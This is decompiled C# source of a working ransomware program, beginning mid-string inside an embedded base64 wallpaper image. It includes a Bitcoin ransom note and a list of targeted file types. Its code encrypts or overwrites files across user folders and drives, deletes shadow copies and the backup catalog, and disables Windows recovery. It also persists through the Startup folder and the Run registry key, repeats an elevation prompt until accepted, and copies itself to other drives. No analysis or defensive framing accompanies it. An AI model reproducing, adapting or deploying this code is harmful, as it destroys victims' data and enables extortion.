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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "HOW_to-DECRYPT.TXT";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[14]
	{
		"All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:", "Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com",
		"", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  3KFzYbnc9quAiYkRFPQM2aekbJujnMq21S", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
